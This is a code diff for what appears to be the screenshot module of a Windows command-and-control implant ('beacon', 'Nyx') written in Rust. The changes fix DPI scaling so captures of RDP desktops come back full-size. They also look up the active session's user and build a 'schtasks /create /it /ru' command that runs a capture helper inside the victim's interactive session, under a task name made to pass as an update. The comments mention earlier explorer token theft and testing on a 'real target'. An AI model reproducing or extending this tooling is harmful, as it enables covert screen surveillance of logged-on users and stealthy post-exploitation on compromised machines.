@@ -90,36 +90,142 @@ fn force_load(dll: &[u8]) -> bool {
 }
 
 // ---- DPI awareness --------------------------------------------------------
+
+/// `HRESULT` from a DPI-set call when the awareness was already established
+/// (by an earlier API call or by the EXE manifest — rundll32's case). Treated
+/// as success, subject to the [`dpi_is_aware`] verification below.
+const E_ACCESSDENIED_HR: i32 = 0x8007_0005u32 as i32;
+
+/// Query the thread's effective DPI awareness via
+/// `user32!GetDpiAwarenessContext` + `GetAwarenessFromDpiAwarenessContext`
+/// (Win10 1607+). Returns true when the process is system- or per-monitor
+/// aware — i.e. `GetSystemMetrics` yields PHYSICAL pixels. False when the
+/// exports are missing (pre-1607 OS) or the process is still unaware.
+///
+/// This — not the setters' return codes — is the source of truth: every
+/// setter fails with E_ACCESSDENIED once awareness exists, and a BOOL/HRESULT
+/// alone can't distinguish that from a genuine failure.
+fn dpi_is_aware() -> bool {
+    type GetDpiAwarenessContext = unsafe extern "system" fn() -> *mut c_void;
+    type GetAwarenessFromDpiAwarenessContext = unsafe extern "system" fn(*mut c_void) -> u32;
+    let gdac: GetDpiAwarenessContext =
+        match unsafe { export_addr(b"user32.dll", b"GetDpiAwarenessContext") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let gafdac: GetAwarenessFromDpiAwarenessContext =
+        match unsafe { export_addr(b"user32.dll", b"GetAwarenessFromDpiAwarenessContext") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let ctx = unsafe { gdac() };
+    if ctx.is_null() {
+        return false;
+    }
+    // DPI_AWARENESS: 0 = unaware, 1 = system, 2 = per-monitor.
+    let awareness = unsafe { gafdac(ctx) };
+    awareness != 0
+}
+
+/// Set the calling THREAD's DPI awareness context to Per-Monitor V2
+/// (`DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2` = (HANDLE)-4, Win10 1607+).
+/// Returns the previous context for later restore, or `None` when the API is
+/// missing or the call failed.
+///
+/// Why thread-level: the cross-session helper runs inside `rundll32.exe`,
+/// whose manifest pins process awareness (system-aware). Process-level
+/// setters then fail with E_ACCESSDENIED, and "system-aware" is NOT good
+/// enough on an RDP session whose per-session scaling differs from the system
+/// DPI (e.g. session at 200%, system at 96): GDI still virtualizes the
+/// process and the capture comes back as a cropped top-left rect (verified on
+/// the real target: a 2294x1438 desktop @200% returned as 1147x719 — exactly
+/// half in both axes). The THREAD context overrides the manifest for every
+/// GetSystemMetrics/GetDC/BitBlt made on this thread, yielding physical
+/// pixels regardless of what the EXE declared.
+fn set_thread_dpi_pmv2() -> Option<isize> {
+    type SetThreadDpiAwarenessContext = unsafe extern "system" fn(isize) -> isize;
+    let f: SetThreadDpiAwarenessContext = unsafe {
+        core::mem::transmute(export_addr(b"user32.dll", b"SetThreadDpiAwarenessContext")?)
+    };
+    // Return value: the PREVIOUS context handle (non-zero) on success, NULL
+    // on failure (e.g. invalid context value, or pre-1607 stub).
+    let old = unsafe { f(-4) };
+    if old == 0 {
+        None
+    } else {
+        Some(old)
+    }
+}
+
+/// Restore a thread DPI awareness context saved by [`set_thread_dpi_pmv2`].
+/// Best-effort; only called when the set succeeded, so the export exists.
+unsafe fn restore_thread_dpi(old: isize) {
+    type SetThreadDpiAwarenessContext = unsafe extern "system" fn(isize) -> isize;
+    if let Some(a) = unsafe { export_addr(b"user32.dll", b"SetThreadDpiAwarenessContext") } {
+        let f: SetThreadDpiAwarenessContext = unsafe { core::mem::transmute(a) };
+        unsafe { f(old) };
+    }
+}
+
 /// Set the process DPI awareness so GDI calls return physical-pixel sizes.
 /// Tries, in order:
-/// 1. `SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE_V2=3)` – Win10 1607+
-/// 2. `SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE=2)`   – Win 8.1+
-/// 3. `SetProcessDPIAware()`                                       – Vista/7
+/// 1. `user32!SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2)` – Win10 1703+
+/// 2. `shcore!SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE)` – Win 8.1+
+/// 3. `user32!SetProcessDPIAware()` – Vista/7
+///
+/// Per-Monitor V2 can ONLY be set via the tier-1 context API: shcore's
+/// `SetProcessDpiAwareness` takes the `PROCESS_DPI_AWARENESS` enum (0/1/2
+/// only), so the old code's `f(3)` returned E_INVALIDARG — and its inverted
+/// `!= 0` check read that failure as success, leaving the process DPI-unaware
+/// (the 1147x719-virtualized-crop bug). All checks below treat S_OK/0 as
+/// success and re-verify via [`dpi_is_aware`].
 ///
 /// **Must be called before any `GetDC` / `CreateCompatibleBitmap`**.
 /// Best-effort: failure is silent (the capture proceeds with whatever the
 /// system gives us), but on modern Windows this almost always succeeds.
 fn set_dpi_aware() -> bool {
-    // Win10 1607+ / Win 8.1+: shcore.dll SetProcessDpiAwareness
-    if let Some(addr) = unsafe { export_addr(b"shcore.dll", b"SetProcessDpiAwareness") } {
-        type SetProcessDpiAwareness = unsafe extern "system" fn(u32) -> i32;
-        let f: SetProcessDpiAwareness = unsafe { core::mem::transmute(addr) };
-        // PROCESS_PER_MONITOR_DPI_AWARE_V2 = 3
-        if unsafe { f(3) } != 0 {
-            return true;
-        }
-        // PROCESS_PER_MONITOR_DPI_AWARE = 2
-        if unsafe { f(2) } != 0 {
+    // Already aware (manifest-declared, or set by a previous capture)? Nothing
+    // to do — every setter would just fail with E_ACCESSDENIED.
+    if dpi_is_aware() {
+        return true;
+    }
+    // Tier 1 — Win10 1703+: DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 =
+    // (HANDLE)-4. Returns BOOL; on failure we re-query rather than trusting
+    // GetLastError, so E_ACCESSDENIED (already set) is handled for free.
+    if let Some(addr) = unsafe { export_addr(b"user32.dll", b"SetProcessDpiAwarenessContext") } {
+        type SetProcessDpiAwarenessContext = unsafe extern "system" fn(*mut c_void) -> i32;
+        let f: SetProcessDpiAwarenessContext = unsafe { core::mem::transmute(addr) };
+        let _ = unsafe { f(-4isize as *mut c_void) };
+        if dpi_is_aware() {
             return true;
         }
     }
-    // Vista / 7 fallback
+    // Tier 2 — Win 8.1+: shcore enum API (2 = PROCESS_PER_MONITOR_DPI_AWARE).
+    // S_OK(0) = set now; E_ACCESSDENIED = already set (also fine). shcore is
+    // not guaranteed mapped, so force-load before resolving.
+    if force_load(b"shcore.dll") {
+        if let Some(addr) = unsafe { export_addr(b"shcore.dll", b"SetProcessDpiAwareness") } {
+            type SetProcessDpiAwareness = unsafe extern "system" fn(u32) -> i32;
+            let f: SetProcessDpiAwareness = unsafe { core::mem::transmute(addr) };
+            let hr = unsafe { f(2) };
+            if hr == 0 || hr == E_ACCESSDENIED_HR || dpi_is_aware() {
+                return true;
+            }
+        }
+    }
+    // Tier 3 — Vista/7: system-DPI aware only. GetDpiAwarenessContext doesn't
+    // exist that far back, so trust the BOOL here (it is FALSE only on a real
+    // failure or when already set by manifest — and the dpi_is_aware pre-check
+    // above already covers the already-set case on 1607+).
     if let Some(addr) = unsafe { export_addr(b"user32.dll", b"SetProcessDPIAware") } {
         type SetProcessDPIAware = unsafe extern "system" fn() -> i32;
         let f: SetProcessDPIAware = unsafe { core::mem::transmute(addr) };
-        return unsafe { f() } != 0;
+        if unsafe { f() } != 0 {
+            return true;
+        }
     }
-    false
+    // Last word: whatever state we actually ended up in.
+    dpi_is_aware()
 }
 
 // ---- BITMAPINFOHEADER -----------------------------------------------------
@@ -427,8 +533,14 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     if !force_load(b"user32.dll") || !force_load(b"gdi32.dll") {
         return None;
     }
-    // DPI aware must come BEFORE any GetDC / CreateCompatibleBitmap.
-    let dpi_aware = set_dpi_aware();
+    // Thread-level Per-Monitor-V2 FIRST (see set_thread_dpi_pmv2): overrides
+    // the rundll32 manifest and is what GDI virtualization actually keys on.
+    // Without it the process-level setters below can't save us on an RDP
+    // session with per-session scaling ≠ system DPI.
+    let old_ctx = set_thread_dpi_pmv2();
+    // Process-level fallback for pre-1607 hosts. Must come BEFORE any
+    // GetDC / CreateCompatibleBitmap.
+    let dpi_aware = set_dpi_aware() || old_ctx.is_some();
     let _ = unsafe { attach_interactive() };
 
     // Wrap in a closure so detach_interactive() runs on EVERY return path
@@ -586,6 +698,11 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     // Restore the original window station + close our WinSta0 handle on every
     // exit path (success, screen-size check failure, GDI failure, etc.).
     unsafe { detach_interactive() };
+    // Restore the thread DPI context (matters for path 1 inside the beacon
+    // process, which keeps running; the helper exits anyway).
+    if let Some(o) = old_ctx {
+        unsafe { restore_thread_dpi(o) };
+    }
     result
 }
 
@@ -656,12 +773,74 @@ unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
     ok
 }
 
+/// TEMP diagnostic for the 200%-RDP-session virtualized-crop investigation:
+/// logs (to C:\Windows\Temp\nyx_dpi_diag.txt) whether the thread-PMv2 call
+/// resolves/succeeds and the virtual-screen metrics BEFORE/AFTER it, from
+/// inside the helper process. Called by `nyx_screenshot_session`. Remove once
+/// the crop issue is closed out.
+pub unsafe fn dpi_probe_diag() {
+    let mut s: Vec<u8> = Vec::new();
+    fn num(s: &mut Vec<u8>, v: i64) {
+        if v < 0 {
+            s.push(b'-');
+        }
+        let mut u = v.unsigned_abs();
+        let mut tmp = [0u8; 20];
+        let mut n = 0usize;
+        if u == 0 {
+            tmp[0] = b'0';
+            n = 1;
+        }
+        while u != 0 {
+            tmp[n] = b'0' + (u % 10) as u8;
+            n += 1;
+            u /= 10;
+        }
+        for k in (0..n).rev() {
+            s.push(tmp[k]);
+        }
+    }
+    type Gsm = unsafe extern "system" fn(i32) -> i32;
+    type Stdac = unsafe extern "system" fn(isize) -> isize;
+    let Some(gsm_a) = (unsafe { export_addr(b"user32.dll", b"GetSystemMetrics") }) else {
+        return;
+    };
+    let gsm: Gsm = unsafe { core::mem::transmute(gsm_a) };
+    s.extend_from_slice(b"vs_before=");
+    num(&mut s, unsafe { gsm(78) } as i64);
+    s.push(b'x');
+    num(&mut s, unsafe { gsm(79) } as i64);
+    s.push(b'\n');
+    match unsafe { export_addr(b"user32.dll", b"SetThreadDpiAwarenessContext") } {
+        None => s.extend_from_slice(b"stdac=UNRESOLVED\n"),
+        Some(a) => {
+            let f: Stdac = unsafe { core::mem::transmute(a) };
+            let old = unsafe { f(-4) };
+            s.extend_from_slice(b"stdac_old=");
+            num(&mut s, old as i64);
+            s.push(b'\n');
+        }
+    }
+    s.extend_from_slice(b"vs_after=");
+    num(&mut s, unsafe { gsm(78) } as i64);
+    s.push(b'x');
+    num(&mut s, unsafe { gsm(79) } as i64);
+    s.push(b'\n');
+    if let Some(a) = unsafe { export_addr(b"user32.dll", b"GetDpiForSystem") } {
+        type Gdfs = unsafe extern "system" fn() -> u32;
+        let g: Gdfs = unsafe { core::mem::transmute(a) };
+        s.extend_from_slice(b"getdpi=");
+        num(&mut s, unsafe { g() } as i64);
+        s.push(b'\n');
+    }
+    let _ = unsafe { write_all_to_file(b"C:\\Windows\\Temp\\nyx_dpi_diag.txt\0", &s) };
+}
+
 /// Capture → write BMP to `path` (ASCII, NUL-terminated). Helper export path.
 pub unsafe fn capture_to_file(path: &[u8]) -> bool {
     let bmp = match capture_bmp() {
         Some((b, _dpi_aware)) => b,
-        None => return false,
-    };
+        None => return false,    };
     unsafe { write_all_to_file(path, &bmp) }
 }
 
@@ -719,7 +898,7 @@ fn format_err(c: u8) -> String {
         2 => "wtsapi32.dll load failed",
         3 => "(legacy) explorer token theft — no longer used by the schtasks path",
         4 => "DLL path self-discovery failed (GetModuleHandleExW + GetModuleFileNameW)",
-        5 => "schtasks create/run failed (Task Scheduler service down, or not enough privilege to create a task)",
+        5 => "schtasks create/run failed (Task Scheduler service down, insufficient privilege, or /ru principal resolution failed)",
         6 => "helper finished but produced no readable BMP",
         7 => "helper did not produce a BMP within 15s (capture failed in the interactive session, or scheduler didn't launch it)",
         8 => "an export could not be resolved",
@@ -805,17 +984,61 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         } // no active session
     };
 
-    // 2. No token theft needed. The Task Scheduler service runs as SYSTEM and
-    //    has the privileges to launch a process into any interactive session
-    //    (it is the same mechanism `schtasks /ru <user> /it` uses). We do NOT
-    //    steal explorer's token, do NOT need SeDebugPrivilege, and do NOT call
-    //    CreateProcess{AsUser,WithToken}W — all of those failed on a privilege-
-    //    constrained Administrator beacon (CPAU needs SeAssignPrimaryToken,
-    //    CPWT's spawned process was rejected by the target desktop's ACL with
-    //    ERROR_ACCESS_DENIED). Verified on the real target: only the scheduler
-    //    path reliably lands the helper in Session 2 and produces a BMP. `sid`
-    //    is still used below for the `--it` flag / session selection context.
-    let _ = sid;
+    // 2. Resolve the active session's user for the schtasks `/ru` principal.
+    //    As SYSTEM, `schtasks /create /it` WITHOUT /ru fails with
+    //    (40,4):UserId "no mapping between account names and security IDs" —
+    //    the scheduler cannot derive an interactive principal from the SYSTEM
+    //    context (verified on the real target: create_exit=1). With
+    //    `/ru <user> /it` (no /rp) the task gets an interactive-token
+    //    principal: it runs as that user, in THEIR session, while they're
+    //    logged on — exactly where the desktop lives. We do NOT steal
+    //    explorer's token, need SeDebugPrivilege, or call
+    //    CreateProcess{AsUser,WithToken}W — all of those failed on a
+    //    privilege-constrained host (CPAU needs SeAssignPrimaryToken, CPWT was
+    //    rejected by the target desktop's ACL).
+    // WTSQuerySessionInformationW(hServer, SessionId, WTSInfoClass, ppBuffer,
+    // pBytesReturned) -> BOOL. WTS_INFO_CLASS: WTSUserName=5, WTSDomainName=7.
+    type WTSQuerySessionInfoW = unsafe extern "system" fn(
+        *mut c_void,
+        u32,
+        u32,
+        *mut *mut u16,
+        *mut u32,
+    ) -> i32;
+    let query_si: WTSQuerySessionInfoW = unsafe {
+        core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW")?)
+    };
+    // Returned buffers are UTF-16, byte count includes the trailing NUL, and
+    // must be freed with WTSFreeMemory.
+    let query_str = |class: u32| -> crate::heap::Vec<u16> {
+        let mut p: *mut u16 = core::ptr::null_mut();
+        let mut bytes: u32 = 0;
+        let mut out = crate::heap::Vec::new();
+        if unsafe { query_si(core::ptr::null_mut(), sid, class, &mut p, &mut bytes) } != 0
+            && !p.is_null()
+        {
+            let slice =
+                unsafe { core::slice::from_raw_parts(p, (bytes as usize) / 2) };
+            out.extend_from_slice(slice);
+            while out.last() == Some(&0) {
+                out.pop();
+            }
+            unsafe { free_mem(p as *mut c_void) };
+        }
+        out
+    };
+    let user = query_str(5);
+    let domain = query_str(7);
+    // "DOMAIN\user" when a domain is present, bare user otherwise. schtasks
+    // resolves both local ("HOST\user" / "user") and domain principals.
+    let mut runas: crate::heap::Vec<u16> = crate::heap::Vec::new();
+    if !user.is_empty() {
+        if !domain.is_empty() {
+            runas.extend_from_slice(&domain);
+            runas.push(b'\\' as u16);
+        }
+        runas.extend_from_slice(&user);
+    }
 
     // 3. Resolve the DLL path. Try GetModuleHandleExW(FROM_ADDRESS) first (finds
     //    the DLL containing this fn); on failure fall back to the canonical
@@ -873,16 +1096,17 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         helper_cmd.push(by as u16);
     }
 
-    // 5. Spawn the helper via the Task Scheduler service. We create a one-shot
-    //    task that runs in the current security context (SYSTEM — the beacon's
-    //    own token, no hardcoded username).  The `/it` flag requests interactive
-    //    execution, which lands the helper in the active session's desktop even
-    //    from Session 0.  The scheduler service (svchost, SYSTEM) has the
-    //    privileges to attach the new process to the target session's
-    //    WinSta0\default — this is exactly what the token-based APIs could NOT
-    //    do on a privilege-constrained host (CPAU needs SeAssignPrimaryToken,
-    //    CPWT was rejected by the desktop ACL). Verified on the real target:
-    //    this path produces a valid BMP.
+    // 5. Spawn the helper via the Task Scheduler service. The one-shot task
+    //    runs as the ACTIVE SESSION's user (`/ru <user> /it`, resolved in step
+    //    2) with an interactive-token principal — the helper therefore lands in
+    //    that session's desktop even from a Session-0 SYSTEM beacon. The
+    //    scheduler service (svchost, SYSTEM) has the privileges to attach the
+    //    new process to the target session's WinSta0\default — exactly what the
+    //    token-based APIs could NOT do on a privilege-constrained host (CPAU
+    //    needs SeAssignPrimaryToken, CPWT was rejected by the desktop ACL).
+    //    Verified on the real target: /it WITHOUT /ru fails from SYSTEM with
+    //    (40,4):UserId "no mapping between account names and security IDs";
+    //    with /ru <session-user> this path produces a valid BMP.
     //
     //    A pseudo-random task name (NyxUpdateNNNN) avoids collisions with
     //    concurrent screenshot calls and masquerades as an update task. We use
@@ -896,7 +1120,11 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     let seed = unsafe { gtc() };
     push_dec_u16(&mut task_name, ((seed % 9000) + 1000) as u16); // 1000–9999
 
-    // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /it /f
+    // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /it [/ru "<runas>"] /f
+    // `/ru <session-user>` is REQUIRED from a SYSTEM beacon — without it the
+    // scheduler can't map SYSTEM to an interactive principal ((40,4):UserId).
+    // If the username query failed we fall back to the old /it-only form,
+    // which still works from a user-context beacon.
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
     for &by in b"schtasks /create /tn " {
         create_cmd.push(by as u16);
@@ -906,7 +1134,17 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         create_cmd.push(by as u16);
     }
     create_cmd.extend_from_slice(&helper_cmd);
-    for &by in b"\" /sc once /st 23:59 /it /f\0" {
+    for &by in b"\" /sc once /st 23:59 /it" {
+        create_cmd.push(by as u16);
+    }
+    if !runas.is_empty() {
+        for &by in b" /ru \"" {
+            create_cmd.push(by as u16);
+        }
+        create_cmd.extend_from_slice(&runas);
+        create_cmd.push(b'"' as u16);
+    }
+    for &by in b" /f\0" {
         create_cmd.push(by as u16);
     }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
